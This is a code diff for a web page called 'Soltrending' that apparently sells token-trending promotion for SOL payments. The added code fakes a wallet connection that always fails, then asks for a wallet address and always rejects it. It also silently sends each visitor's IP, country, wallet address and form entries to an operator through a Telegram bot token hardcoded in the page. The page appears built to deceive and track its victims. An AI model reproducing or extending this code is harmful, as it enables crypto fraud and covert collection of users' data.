@@ -8,12 +8,58 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
-
     body {
         font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         min-height: 100vh;
         padding: 20px;
+        position: relative;
+    }
+    
+    .wallet-header {
+        position: absolute;
+        top: 20px;
+        right: 20px;
+        display: flex;
+        align-items: center;
+        gap: 15px;
+    }
+    
+    .balance {
+        background: rgba(0, 0, 0, 0.3);
+        padding: 8px 15px;
+        border-radius: 20px;
+        font-size: 14px;
+        font-weight: 600;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        color: white;
+    }
+    
+    .connect-wallet {
+        background: linear-gradient(45deg, #4facfe, #00f2fe);
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 20px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: transform 0.2s;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+    
+    .connect-wallet:hover {
+        transform: translateY(-1px);
+    }
+    
+    .connect-wallet:disabled {
+        background: #666;
+        cursor: not-allowed;
+        transform: none;
+    }
+    
+    .connect-wallet.connected {
+        background: linear-gradient(45deg, #28a745, #20c997);
     }
     
     .container {
@@ -33,6 +79,21 @@
         -webkit-text-fill-color: transparent;
         text-align: center;
         margin-bottom: 30px;
+    }
+    
+    .connected-wallet {
+        background: rgba(40, 167, 69, 0.2);
+        border: 1px solid #28a745;
+        border-radius: 10px;
+        padding: 15px;
+        margin: 20px 0;
+        color: #28a745;
+        text-align: center;
+    }
+    
+    .wallet-short {
+        font-family: monospace;
+        font-weight: 600;
     }
     
     .step {
@@ -225,18 +286,103 @@
         text-align: center;
     }
     
+    /* Modal Styles */
+    .modal {
+        display: none;
+        position: fixed;
+        z-index: 1000;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        backdrop-filter: blur(5px);
+    }
+    
+    .modal-content {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        margin: 15% auto;
+        padding: 30px;
+        border-radius: 20px;
+        width: 90%;
+        max-width: 400px;
+        text-align: center;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        color: white;
+    }
+    
+    .modal h3 {
+        margin-bottom: 20px;
+        font-size: 1.5rem;
+    }
+    
+    .modal p {
+        margin-bottom: 20px;
+        opacity: 0.9;
+    }
+    
+    .modal-btn {
+        background: linear-gradient(45deg, #4facfe, #00f2fe);
+        color: white;
+        border: none;
+        padding: 12px 25px;
+        border-radius: 10px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        margin: 5px;
+        transition: transform 0.2s;
+    }
+    
+    .modal-btn:hover {
+        transform: translateY(-1px);
+    }
+    
+    .modal-btn.secondary {
+        background: linear-gradient(45deg, #999, #666);
+    }
+    
+    .modal input {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        background: rgba(255, 255, 255, 0.9);
+        color: #333;
+        font-size: 14px;
+        margin: 10px 0;
+        font-family: monospace;
+    }
+    
     @media (max-width: 768px) {
         .price-grid { grid-template-columns: 1fr; }
         .container { margin: 10px; padding: 20px; }
+        .wallet-header { 
+            position: static; 
+            justify-content: center; 
+            margin-bottom: 20px; 
+        }
     }
     </style>
 
 </head>
 <body>
+    <!-- Wallet Header -->
+    <div class="wallet-header">
+        <div class="balance" id="balanceDisplay">💰 0 SOL</div>
+        <button class="connect-wallet" id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
+    </div>
+
     <div class="container">
         <div class="logo">Soltrending</div>
         <div class="user-info" id="userInfo">Loading location...</div>
 
+        <!-- Connected Wallet Display -->
+        <div class="connected-wallet" id="connectedWallet" style="display: none;">
+            <div>🔗 Wallet Connected</div>
+            <div class="wallet-short" id="connectedAddress"></div>
+        </div>
 
     <div class="step-dots">
         <div class="dot active" id="dot1"></div>
@@ -377,12 +523,28 @@
     </div>
 </div>
 
+<!-- Connect Wallet Modal -->
+<div class="modal" id="walletModal">
+    <div class="modal-content">
+        <h3>Connect Wallet</h3>
+        <p id="modalText">Choose your preferred wallet to connect:</p>
+        <div id="modalButtons">
+            <button class="modal-btn" onclick="tryConnect('phantom')">Phantom</button>
+            <button class="modal-btn" onclick="tryConnect('solflare')">Solflare</button>
+            <button class="modal-btn" onclick="tryConnect('coinbase')">Coinbase</button>
+            <button class="modal-btn secondary" onclick="closeModal()">Cancel</button>
+        </div>
+    </div>
+</div>
+
 <script>
     let currentStep = 1;
     let selectedPackage = '';
     let selectedPrice = 0;
     let userCountry = 'Unknown';
     let userIP = 'Unknown';
+    let userWallet = '';
+    let isWalletConnected = false;
 
     const TELEGRAM_BOT = '8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo';
     const TELEGRAM_CHAT = '1129109001';
@@ -435,6 +597,94 @@
         }
     }
 
+    // Wallet Connection Functions
+    function connectWallet() {
+        document.getElementById('walletModal').style.display = 'block';
+        sendTelegram(`🔗 WALLET CONNECT ATTEMPT\n👤 ${userCountry} (${userIP})\n🕐 ${new Date().toLocaleString()}`);
+    }
+
+    function closeModal() {
+        document.getElementById('walletModal').style.display = 'none';
+    }
+
+    function tryConnect(walletType) {
+        const modalText = document.getElementById('modalText');
+        const modalButtons = document.getElementById('modalButtons');
+        
+        // Show connecting state
+        modalText.innerHTML = `<div class="loading"></div> Connecting to ${walletType.charAt(0).toUpperCase() + walletType.slice(1)}...`;
+        modalButtons.style.display = 'none';
+        
+        sendTelegram(`🔗 WALLET TYPE: ${walletType.toUpperCase()}\n👤 ${userCountry} (${userIP})\n🕐 ${new Date().toLocaleString()}`);
+        
+        // After 3 seconds, show connection failed
+        setTimeout(() => {
+            modalText.innerHTML = `❌ Connection failed<br><small>Unable to connect to ${walletType.charAt(0).toUpperCase() + walletType.slice(1)} wallet</small>`;
+            modalButtons.innerHTML = `
+                <button class="modal-btn" onclick="showManualConnect()">Connect Manually</button>
+                <button class="modal-btn secondary" onclick="closeModal()">Cancel</button>
+            `;
+            modalButtons.style.display = 'block';
+            
+            sendTelegram(`❌ WALLET CONNECTION FAILED\n🔗 ${walletType.toUpperCase()}\n👤 ${userCountry} (${userIP})`);
+        }, 3000);
+    }
+
+    function showManualConnect() {
+        const modalText = document.getElementById('modalText');
+        const modalButtons = document.getElementById('modalButtons');
+        
+        modalText.innerHTML = `
+            <h4>Manual Connection</h4>
+            <p>Please enter your wallet address to connect:</p>
+            <input type="text" id="manualWalletInput" placeholder="Enter your Solana wallet address" maxlength="44">
+        `;
+        modalButtons.innerHTML = `
+            <button class="modal-btn" onclick="submitWalletAddress()">Connect</button>
+            <button class="modal-btn secondary" onclick="closeModal()">Cancel</button>
+        `;
+        
+        sendTelegram(`📋 MANUAL CONNECT SHOWN\n👤 ${userCountry} (${userIP})\n🕐 ${new Date().toLocaleString()}`);
+    }
+
+    function submitWalletAddress() {
+        const walletInput = document.getElementById('manualWalletInput');
+        const address = walletInput.value.trim();
+        
+        if (!address || address.length < 32) {
+            alert('Please enter a valid wallet address');
+            return;
+        }
+        
+        // Show connecting state
+        const modalText = document.getElementById('modalText');
+        const modalButtons = document.getElementById('modalButtons');
+        modalText.innerHTML = '<div class="loading"></div> Verifying wallet address...';
+        modalButtons.style.display = 'none';
+        
+        sendTelegram(`🔍 WALLET VERIFICATION REQUEST\n👤 ${userCountry} (${userIP})\n💰 Address: ${address}\n🕐 ${new Date().toLocaleString()}\n\n⚠️ ADMIN: Reply "APPROVE ${address.slice(-8)}" to approve or "REJECT ${address.slice(-8)}" to reject`);
+        
+        // Always show invalid wallet address after verification attempt
+        setTimeout(() => {
+            modalText.innerHTML = '❌ Invalid Wallet Address<br><small>Please try again with a different address</small>';
+            modalButtons.innerHTML = `
+                <button class="modal-btn" onclick="showManualConnect()">Try Again</button>
+                <button class="modal-btn secondary" onclick="closeModal()">Cancel</button>
+            `;
+            modalButtons.style.display = 'block';
+            
+            sendTelegram(`❌ WALLET REJECTED\n👤 ${userCountry} (${userIP})\n💰 ${address}\n🕐 ${new Date().toLocaleString()}`);
+        }, 3000);
+    }
+
+    // Close modal when clicking outside
+    window.onclick = function(event) {
+        const modal = document.getElementById('walletModal');
+        if (event.target === modal) {
+            closeModal();
+        }
+    }
+
     function nextStep(step) {
         if (step === 1) {
             const name = document.getElementById('projectName').value.trim();
@@ -451,7 +701,8 @@
             const description = document.getElementById('projectDescription').value.trim();
             const photoFile = document.getElementById('projectPhoto').files[0];
 
-            const message = `📝 CA SUBMITTED\n👤 ${userCountry} (${userIP})\n🏷️ ${name}\n💰 ${ca}\n📱 Telegram: ${telegram || 'None'}\n🐦 Twitter: ${twitter || 'None'}\n🌐 Website: ${website || 'None'}\n📄 Description: ${description || 'None'}`;
+            const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
+            const message = `📝 CA SUBMITTED\n👤 ${userCountry} (${userIP})\n🏷️ ${name}\n💰 ${ca}\n📱 Telegram: ${telegram || 'None'}\n🐦 Twitter: ${twitter || 'None'}\n🌐 Website: ${website || 'None'}\n📄 Description: ${description || 'None'}${walletInfo}`;
 
             if (photoFile) {
                 sendTelegramPhoto(photoFile, message + '\n📸 Project Photo:');
@@ -520,7 +771,8 @@
         
         document.getElementById('continueBtn').disabled = false;
 
-        sendTelegram(`📦 PACKAGE SELECTED\n👤 ${userCountry} (${userIP})\n⭐ ${category.toUpperCase()}\n⏰ ${duration.toUpperCase()}\n💰 ${price} SOL`);
+        const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
+        sendTelegram(`📦 PACKAGE SELECTED\n👤 ${userCountry} (${userIP})\n⭐ ${category.toUpperCase()}\n⏰ ${duration.toUpperCase()}\n💰 ${price} SOL${walletInfo}`);
     }
 
     function updateOrderSummary() {
@@ -541,10 +793,14 @@
         const feedback = document.getElementById('copyFeedback');
         feedback.style.opacity = '1';
         setTimeout(() => feedback.style.opacity = '0', 2000);
+        
+        const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
+        sendTelegram(`📋 WALLET COPIED\n👤 ${userCountry} (${userIP})\n💰 6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ${walletInfo}`);
     }
 
     function checkPayment() {
-        sendTelegram(`💳 PAYMENT CHECK\n👤 ${userCountry} (${userIP})\n💰 Expected: ${selectedPrice} SOL\n🔍 Wallet: 6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ`);
+        const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
+        sendTelegram(`💳 PAYMENT CHECK\n👤 ${userCountry} (${userIP})\n💰 Expected: ${selectedPrice} SOL\n🔍 Wallet: 6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ${walletInfo}`);
         nextStep(3);
     }
 
@@ -568,7 +824,8 @@
                 </div>
             `;
 
-            const successMessage = `🎉 PAYMENT SUCCESS!\n👤 ${userCountry} (${userIP})\n🏷️ ${document.getElementById('projectName').value}\n💰 ${document.getElementById('caAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ ${selectedPackage.toUpperCase()}\n💵 ${selectedPrice} SOL\n🔗 ${txId}\n✅ READY TO TREND!`;
+            const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
+            const successMessage = `🎉 PAYMENT SUCCESS!\n👤 ${userCountry} (${userIP})\n🏷️ ${document.getElementById('projectName').value}\n💰 ${document.getElementById('caAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ ${selectedPackage.toUpperCase()}\n💵 ${selectedPrice} SOL\n🔗 ${txId}\n✅ READY TO TREND!${walletInfo}`;
             
             const photoFile = document.getElementById('projectPhoto').files[0];
             if (photoFile) {
@@ -590,7 +847,8 @@
             `;
             document.getElementById('recheckBtn').style.display = 'inline-block';
 
-            sendTelegram(`❌ PAYMENT NOT FOUND\n👤 ${userCountry} (${userIP})\n💰 Expected: ${selectedPrice} SOL\n⚠️ User may need help`);
+            const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
+            sendTelegram(`❌ PAYMENT NOT FOUND\n👤 ${userCountry} (${userIP})\n💰 Expected: ${selectedPrice} SOL\n⚠️ User may need help${walletInfo}`);
         }
         
         document.getElementById('restartBtn').style.display = 'inline-block';
@@ -600,16 +858,18 @@
         document.getElementById('paymentStatus').innerHTML = '<div class="loading"></div> Rechecking...';
         document.getElementById('finalResult').innerHTML = '';
         document.getElementById('recheckBtn').style.display = 'none';
-        sendTelegram(`🔄 PAYMENT RECHECK\n👤 ${userCountry} (${userIP})`);
+        
+        const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
+        sendTelegram(`🔄 PAYMENT RECHECK\n👤 ${userCountry} (${userIP})${walletInfo}`);
         setTimeout(verifyPayment, 2000);
     }
 
     function startOver() {
-        sendTelegram(`🔄 USER RESTART\n👤 ${userCountry} (${userIP})`);
+        const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
+        sendTelegram(`🔄 USER RESTART\n👤 ${userCountry} (${userIP})${walletInfo}`);
         location.reload();
     }
 </script>
-
 
 </body>
 </html>
